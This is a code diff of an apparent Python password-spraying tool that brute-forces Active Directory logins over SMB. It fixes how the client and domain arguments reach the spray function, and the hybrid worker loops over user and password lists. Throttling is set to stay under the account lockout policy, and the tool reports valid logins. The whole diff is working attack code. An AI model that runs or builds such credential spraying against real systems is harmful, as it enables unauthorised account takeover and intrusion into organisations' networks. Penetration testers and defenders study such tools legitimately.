@@ -206,7 +206,7 @@ def hybrid_office_worker(policy, user, _pass):
     else:
         print(Fore.RED +"[!]Unknown input. Check the usage")
 
-def sprayAD(host,username,password,client,computerName="",domain=""):
+def sprayAD(host,username,password,client,computerName,domain_name=""):
     if verbose:
         print(Fore.YELLOW +
               "Checking credentials {0}:{1}".format(username, password))
@@ -214,14 +214,14 @@ def sprayAD(host,username,password,client,computerName="",domain=""):
     if not computerName:
         computerName = getServerName(IP)
 
-    conn = SMBConnection(username,password,client,computerName,domain,use_ntlm_v2 = True,is_direct_tcp=True)
+    conn = SMBConnection(username,password,client,computerName,domain=domain_name,use_ntlm_v2 = True,is_direct_tcp=True)
     if conn.connect(IP,int(port)):
         print(Fore.GREEN+"VALID LOGIN on {}:{} using {}:{}".format(IP,port,username,password))
     else:
         print(Fore.RED+"INVALID LOGIN on {}:{} using {}:{}".format(IP,port,username,password))
     
 
-def hybrid_smb_worker(host, policy, user, _pass, client, computerName=""):
+def hybrid_smb_worker(host, policy, user, _pass, client, computerName="", domain=""):
     #Run hybrid bruteforcing here
     attempts = 1
     
@@ -236,7 +236,7 @@ def hybrid_smb_worker(host, policy, user, _pass, client, computerName=""):
                 if attempts == max_attempts:
                     sleep(timelimit)
                     attempts = 1
-                sprayAD(host,user, password.strip("\n"),computerName)
+                sprayAD(host,user, password.strip("\n"), client, computerName, domain_name=domain)
                 attempts = attempts + 1
                 sleep(timelimit//max_attempts)
         except Exception as e:
@@ -249,7 +249,7 @@ def hybrid_smb_worker(host, policy, user, _pass, client, computerName=""):
                 if attempts == max_attempts:
                     sleep(timelimit)
                     attempts = 1
-                sprayAD(host, username.strip("\n"), _pass, computerName)
+                sprayAD(host, username.strip("\n"), _pass, client, computerName, domain_name=domain)
                 attempts = attempts + 1
                 sleep(timelimit//max_attempts)
         except Exception as e:
@@ -263,7 +263,7 @@ def hybrid_smb_worker(host, policy, user, _pass, client, computerName=""):
                     if attempts == max_attempts:
                         sleep(timelimit)
                         attempts = 1
-                    sprayAD(host, username.strip("\n"), password.strip("\n"), computerName)
+                    sprayAD(host, username.strip("\n"), password.strip("\n"), client, computerName, domain_name=domain)
                     attempts = attempts + 1
                     sleep(timelimit//max_attempts)
         except Exception as e:
@@ -277,7 +277,7 @@ def getServerName(IP):
     try:
         server = NetBIOS()
         servername = server.queryIPForName(IP)
-        return servername[0]
+        return str(servername[0])
     except:
         print(Fore.RED+"You need to porvide the remote computer or server name")
         exit(0)
@@ -352,21 +352,21 @@ if __name__ == '__main__':
             ArgumentParser().print_help()
             sys.exit(0)
         if single_test:
-            sprayAD(host, username, password, client, servername, domain)
+            sprayAD(host, username, password, client, servername, domain_name=domain)
         else:
             if not policy:
                 ArgumentParser().print_help()
                 sys.exit(0)
             if username and passfile:
                 passfile = open(passfile, 'r')
-                hybrid_smb_worker(host, policy, username, passfile, servername)
+                hybrid_smb_worker(host, policy, username, passfile, client, servername, domain=domain)
             elif userfile and password:
                 userfile = open(userfile, 'r')
-                hybrid_smb_worker(host, policy, userfile, password, servername)
+                hybrid_smb_worker(host, policy, userfile, password, client, servername, domain=domain)
             elif userfile and passfile:
                 passfile = open(passfile, 'r')
                 userfile = open(userfile, 'r')
-                hybrid_smb_worker(host, policy, userfile, passfile, servername)
+                hybrid_smb_worker(host, policy, userfile, passfile, client, servername, domain=domain)
             else:
                 print(Fore.RED+"[+]Unknown error! Check usage")
                 ArgumentParser().print_help()
